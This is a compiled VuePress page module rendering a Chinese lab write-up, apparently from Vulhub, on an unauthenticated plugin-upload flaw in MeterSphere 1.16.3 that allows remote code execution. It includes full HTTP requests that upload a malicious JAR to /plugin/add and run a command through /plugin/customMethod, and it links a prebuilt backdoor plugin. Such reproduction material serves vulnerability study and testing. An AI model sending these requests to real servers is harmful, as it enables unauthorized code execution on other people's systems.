import{_ as l}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as d,c as r,a as e,b as n,d as a,e as t}from"./app-58e4a7d6.js";const o={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),u=e("p",null,"MeterSphere是基于GPLv3协议的一站式的开源持续测试平台。在其1.16.3版本及以前，插件相关管理功能未授权访问，导致攻击者可以通过上传插件的方式在服务器中执行任意代码。",-1),p=e("p",null,"参考连接：",-1),v={href:"https://xz.aliyun.com/t/10772",target:"_blank",rel:"noopener noreferrer"},m=t(`<h2 id="漏洞环境" tabindex="-1"><a class="header-anchor" href="#漏洞环境" aria-hidden="true">#</a> 漏洞环境</h2><p>执行如下命令启动一个MeterSphere 1.16.3服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>MeterSphere初始化成功后，访问<code>http://your-ip:8081</code>即可跳转到默认登录页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>首先，我们访问<code>http://your-ip:8081/plugin/list</code>可见成功返回插件信息（虽然此时插件为空），说明<code>/plugin/*</code>接口存在未授权访问问题，可以利用。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/1-16929500427601.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,7),b={href:"https://github.com/vulhub/metersphere-plugin-Backdoor/releases/tag/v1.1.0",target:"_blank",rel:"noopener noreferrer"},h=e("strong",null,"请勿在非授权环境下测试",-1),g=t(`<p>将恶意插件使用如下数据包上传：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /plugin/add HTTP/1.1
Host: localhost:8081
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJV2KX1EL5qmKWXsd
Content-Length: 11985

------WebKitFormBoundaryJV2KX1EL5qmKWXsd
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;Evil.jar&quot;

[Paste your jar file]
------WebKitFormBoundaryJV2KX1EL5qmKWXsd--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/2-16929500427612.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><blockquote><p><strong>如果使用Burpsuite来复现漏洞，你需要注意数据包编码问题，否则可能将无法复现。</strong></p></blockquote><p>虽然这次上传会返回错误信息，但实际上恶意JAR包已经成功被添加进系统ClassLoader中。</p><p>发送如下数据包来执行<code>org.vulhub.Evil</code>类中的恶意代码：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /plugin/customMethod HTTP/1.1
Host: localhost:8081
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 89

{
  &quot;entry&quot;: &quot;org.vulhub.Evil&quot;,
  &quot;request&quot;: &quot;id&quot;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/3.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,8);function _(f,x){const i=s("ExternalLinkIcon");return d(),r("div",null,[c,u,p,e("ul",null,[e("li",null,[e("a",v,[n("https://xz.aliyun.com/t/10772"),a(i)])])]),m,e("p",null,[n("利用漏洞前，需要准备一个恶意MeterSphere插件。Vulhub提供了一个已经编译好的"),e("a",b,[n("插件"),a(i)]),n("以供测试（"),h,n("）。")]),g])}const y=l(o,[["render",_],["__file","MeterSphere 插件接口未授权访问及远程代码执行.html.vue"]]);export{y as default};
